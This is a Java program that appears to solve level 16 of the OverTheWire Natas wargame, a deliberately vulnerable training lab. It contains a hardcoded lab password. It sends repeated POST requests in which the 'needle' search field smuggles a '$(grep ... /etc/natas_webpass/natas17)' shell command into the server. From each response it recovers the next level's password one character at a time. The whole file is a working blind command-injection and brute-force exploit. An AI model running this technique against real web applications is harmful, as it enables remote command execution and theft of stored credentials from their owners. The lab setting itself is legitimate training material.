
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class Natas16ToNatas17 {

    private static HttpURLConnection con;

    public static void main(String[] args) throws IOException {

        String password = "";
        String chars = "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "0123456789";
        String a = "natas16" + ":" + "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh";
        String auth = new String(Base64.getEncoder().encode(a.getBytes()));
        String needle = "";

        var url = "http://natas16.natas.labs.overthewire.org/";

        while (password.length() < 32) {

            System.out.println("testing the index :" + password.length());

            for (int i = 0; i < 62; i++) {

                System.out.println("testing the char :" + chars.charAt(i));

                needle = "$(grep ^" + password + chars.charAt(i) + " /etc/natas_webpass/natas17)";

                var urlParameters = "needle=" + needle + "&submit=Search";
                byte[] postData = urlParameters.getBytes(StandardCharsets.UTF_8);

                try {

                    var myurl = new URL(url);
                    con = (HttpURLConnection) myurl.openConnection();

                    con.setDoOutput(true);
                    con.setRequestMethod("POST");
                    con.setRequestProperty("User-Agent", "Java client");
                    con.setRequestProperty("Authorization", "Basic " + auth);
                    con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                    try (var wr = new DataOutputStream(con.getOutputStream())) {

                        wr.write(postData);
                    }

                    StringBuilder content;

                    try (var br = new BufferedReader(
                            new InputStreamReader(con.getInputStream()))) {

                        String line;
                        content = new StringBuilder();
                        while ((line = br.readLine()) != null) {
                            content.append(line);
                            content.append(System.lineSeparator());
                        }
                    }

                    //System.out.println(content.toString());
                    if (!content.toString().contains("African")) {
                        password += chars.charAt(i);
                        System.out.println("password is :" + password);
                        System.out.println("-------------------------------------------------");
                        break;
                    }

                } finally {

                    con.disconnect();
                }
            }
        }
    }
}
